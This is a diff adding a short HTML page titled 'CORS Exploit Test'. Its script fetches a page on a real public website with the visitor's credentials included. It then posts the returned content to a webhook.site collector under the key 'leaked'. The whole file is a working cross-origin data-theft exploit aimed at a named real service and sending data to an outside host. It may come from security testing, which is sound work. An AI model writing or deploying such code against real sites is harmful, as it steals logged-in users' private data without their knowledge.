@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CORS Exploit Test</h1>
+<script>
+fetch("https://freizeit.sbb.ch/en/map/7fNskU9xznWE4n47rquYtE", {
+  credentials: 'include'
+})
+.then(response => response.text())
+.then(data => {
+  fetch('https://webhook.site/2b7c7e86-be0e-4e2e-9e38-244039ab08f0', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({leaked: data})
+  });
+})
+.catch(error => console.error('Error:', error));
+</script>
+</body>
+</html>
